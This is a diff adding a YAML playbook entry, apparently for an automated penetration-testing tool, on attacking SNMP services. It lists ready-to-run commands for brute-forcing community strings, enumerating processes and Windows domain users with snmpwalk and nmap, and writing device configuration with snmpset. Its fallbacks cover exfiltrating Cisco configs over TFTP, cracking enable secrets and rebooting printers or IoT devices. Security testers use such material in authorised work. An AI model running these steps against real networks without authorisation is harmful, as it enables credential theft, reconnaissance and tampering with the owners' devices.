@@ -1,0 +1,36 @@
+id: service_snmp_public
+title: "SNMP — community brute, full walk, write-community pwn"
+phase: recon
+mitre: ["T1018", "T1046", "T1602.001"]
+trigger:
+  services: ["snmp"]
+  ports:    [161, 162]
+keywords: ["snmp", "community string", "snmpwalk", "snmp-check", "onesixtyone"]
+preconditions:
+  - "UDP/161 reachable"
+steps:
+  - tool: onesixtyone
+    cmd:  "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt -i targets.txt"
+    why:  "Fast SNMP community brute against many hosts"
+  - tool: nmap
+    cmd:  "nmap -sU -sV -p161,162 --script=snmp-info,snmp-interfaces,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-software,snmp-win32-users,snmp-brute {target}"
+    why:  "Comprehensive enum — proc list, NICs, software inventory, AD users on Windows hosts"
+  - tool: snmpwalk
+    cmd:  "snmpwalk -v2c -c public {target} 1.3.6.1.2.1.25.4.2"
+    why:  "Running processes — enum HostMIB"
+  - tool: snmpwalk
+    cmd:  "snmpwalk -v2c -c public {target} 1.3.6.1.4.1.77.1.2.25"
+    why:  "Windows AD users via LANMAN MIB"
+  - tool: snmp-check
+    cmd:  "snmp-check -c public {target}"
+    why:  "Pretty-formatted enum (uptime, contact, network shares)"
+  - tool: snmpset
+    cmd:  "snmpset -v2c -c private {target} <oid> <type> <value>"
+    why:  "If 'private' or write-community discovered → modify config; restart services; insert routes"
+expected_outcome: "Process list, network topology, AD users, software inventory; RCE via write-community on Cisco/MikroTik"
+fallbacks:
+  - "SNMPv3 + auth required → user enum via crackmapexec / nmap snmp-brute"
+  - "Cisco IOS write-community → tftp config exfil → enable-secret crack"
+  - "Printer / IoT → write to LCD / reboot via OID"
+references:
+  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp"
